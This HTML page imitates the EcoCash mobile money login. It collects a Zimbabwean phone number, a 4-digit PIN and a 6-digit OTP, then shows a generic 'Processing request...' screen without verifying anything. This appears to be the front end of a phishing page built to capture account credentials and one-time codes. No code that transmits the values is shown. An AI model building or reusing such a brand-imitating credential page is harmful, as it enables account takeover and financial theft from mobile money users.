<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Ecocash Login</title>

<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">

<style>

*{box-sizing:border-box}

body{
font-family:"Plus Jakarta Sans",system-ui;
margin:0;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;

background:
linear-gradient(180deg,#e6f0ff,#cfe0ff);

overflow:hidden;
}

/* background */

.wave{
position:fixed;
width:700px;
height:700px;
border-radius:50%;
background:radial-gradient(circle,rgba(0,58,143,.15),transparent 70%);
filter:blur(45px);
animation:float 20s infinite linear;
z-index:-1;
}

.wave.one{top:-250px;right:-150px}
.wave.two{bottom:-250px;left:-150px}

@keyframes float{
0%{transform:translateY(0)}
50%{transform:translateY(40px)}
100%{transform:translateY(0)}
}

/* container */

.step{
position:absolute;
width:100%;
max-width:420px;
padding:30px;
background:white;
border-radius:22px;

box-shadow:
0 25px 50px rgba(0,0,0,.12),
0 6px 14px rgba(0,0,0,.06);

transition:.35s;
}

.container{
position:relative;
width:100%;
max-width:420px;
height:560px;
}

.hidden{
opacity:0;
pointer-events:none;
transform:translateX(40px);
}

/* logo */

.logo{
height:70px;
display:block;
margin:auto;
}

/* text */

h1{
text-align:center;
color:#003a8f;
margin:12px 0 6px;
font-size:22px;
font-weight:800;
}

.subtitle{
text-align:center;
font-size:13px;
color:#555;
margin-bottom:18px;
}

/* inputs */

label{
font-size:12px;
margin-top:12px;
display:block;
color:#444;
}

input{
width:100%;
padding:13px;
border-radius:14px;
border:1px solid #eee;
background:#fafafa;
margin-top:6px;
font-size:14px;
transition:.2s;
}

input:focus{
outline:none;
border-color:#003a8f;
background:white;
box-shadow:0 0 0 3px rgba(0,58,143,.08);
}

/* phone */

.phone-group{
display:flex;
gap:8px;
align-items:center;
}

.prefix{
background:#f1f5ff;
padding:13px;
border-radius:14px;
border:1px solid #eee;
font-weight:600;
color:#003a8f;
}

/* button */

.btn{
margin-top:20px;
width:100%;
padding:13px;
border-radius:14px;
border:0;
font-weight:700;
background:#003a8f;
color:white;
cursor:pointer;
opacity:.45;
}

.btn.active{
opacity:1;
}

/* pin boxes */

.pin{
display:flex;
gap:12px;
justify-content:center;
margin:18px 0;
}

.pin input{
width:52px;
height:58px;
font-size:22px;
text-align:center;
border-radius:16px;
border:1px solid #eee;
background:white;
}

.pin input:focus{
border-color:#003a8f;
box-shadow:0 0 0 3px rgba(0,58,143,.12);
}

/* otp */

.count{
text-align:center;
font-size:13px;
color:#666;
}

.resend{
text-align:center;
margin-top:10px;
font-size:13px;
}

.resend button{
border:0;
background:none;
color:#003a8f;
cursor:pointer;
font-weight:600;
opacity:.4;
}

.resend button.active{
opacity:1;
}

</style>

</head>

<body>

<div class="wave one"></div>
<div class="wave two"></div>

<div class="container">

<!-- LOGIN -->

<div id="step1" class="step">

<img src="assets/ecocash.png" class="logo">

<h1>Login</h1>

<label>Phone Number</label>

<div class="phone-group">

<div class="prefix">+263</div>

<input id="phone" inputmode="numeric" placeholder="7XXXXXXXX">

</div>

<label>Enter your PIN</label>

<div class="pin">

<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">

</div>

<button id="loginBtn" class="btn">

Login

</button>

</div>


<!-- OTP -->

<div id="step3" class="step hidden">

<h1>OTP Verification</h1>

<div class="subtitle" id="maskedNumber">

Enter the OTP sent to your phone number

</div>

<div class="pin">

<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">
<input maxlength="1" inputmode="numeric">

</div>

<div class="count">

Code expires in <span id="time">60</span>s

</div>

<div class="resend">

<button id="resendBtn">

Resend OTP

</button>

</div>

<button class="btn active" onclick="submitOtp()">

Submit

</button>

</div>


<!-- SUCCESS -->

<div id="step4" class="step hidden">

<h1>Success</h1>

<div class="subtitle">

Processing request...

</div>

</div>

</div>



<script>

let phoneValue=""
let pinValue=""
let otpValue=""

/* phone validation */

phone.oninput=e=>{

let v=e.target.value.replace(/\D/g,"")

if(v.length>0 && v[0]!=="7")
v="7"+v.slice(1)

v=v.slice(0,9)

e.target.value=v

phoneValue="+263"+v

validate()

}


/* pin logic */

const pinInputs=document.querySelectorAll("#step1 .pin input")

pinInputs.forEach((input,index)=>{

input.oninput=()=>{

input.value=input.value.replace(/\D/g,"")

if(input.value && index<3)
pinInputs[index+1].focus()

validate()

}

input.onkeydown=e=>{

if(e.key==="Backspace" && !input.value && index>0){

pinInputs[index-1].focus()

pinInputs[index-1].value=""

validate()

}

}

})


function validate(){

pinValue=[...pinInputs].map(i=>i.value).join("")

if(phoneValue.length===13 && pinValue.length===4)

loginBtn.classList.add("active")

else

loginBtn.classList.remove("active")

}


/* show step */

function show(id){

document.querySelectorAll(".step")
.forEach(s=>s.classList.add("hidden"))

document.getElementById(id)
.classList.remove("hidden")

}


/* login click */

loginBtn.onclick=()=>{

if(!loginBtn.classList.contains("active")) return

const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")

document.getElementById("maskedNumber").innerHTML=

`Enter the OTP sent to your phone number ${masked}`

show("step3")

startTimer()

}


/* otp */

const otpInputs=document.querySelectorAll("#step3 .pin input")

otpInputs.forEach((input,index)=>{

input.oninput=()=>{

input.value=input.value.replace(/\D/g,"")

if(input.value && index<5)
otpInputs[index+1].focus()

}

input.onkeydown=e=>{

if(e.key==="Backspace" && !input.value && index>0){

otpInputs[index-1].focus()

otpInputs[index-1].value=""

}

}

})


function submitOtp(){

otpValue=[...otpInputs].map(i=>i.value).join("")

show("step4")

}


/* timer 60 sec */

function startTimer(){

let t=60

time.textContent=t

resendBtn.classList.remove("active")

const i=setInterval(()=>{

t--

time.textContent=t

if(t<=0){

clearInterval(i)

resendBtn.classList.add("active")

}

},1000)

}


resendBtn.onclick=()=>{

if(!resendBtn.classList.contains("active")) return

startTimer()

}

</script>

</body>

</html>
